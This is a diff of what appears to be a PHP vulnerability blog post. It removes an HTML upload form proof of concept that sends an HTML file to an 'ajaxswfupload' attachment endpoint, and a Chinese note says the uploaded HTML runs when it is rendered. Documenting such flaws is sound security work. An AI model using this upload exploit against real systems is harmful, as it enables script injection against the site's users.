@@ -43,16 +43,7 @@ categories: php bug
 
 
 ```
-    <form action="http://192.168.173.1/fine/index.php?c=attachment&a=ajaxswfupload" method="POST" enctype="multipart/form-data">
-
-        <input type="file" name="Filedata">
-
-        <input type="hidden" name="type" value="html">
-
-        <input type="hidden" name="size" value="999">
-
-        <input type="submit" name="submit" value="submit">
-
+http://192.168.173.1/fine/index.php?c=attachment&a=ajaxswfupload
 
 上传一个html , 然后将其渲染就执行了。
 
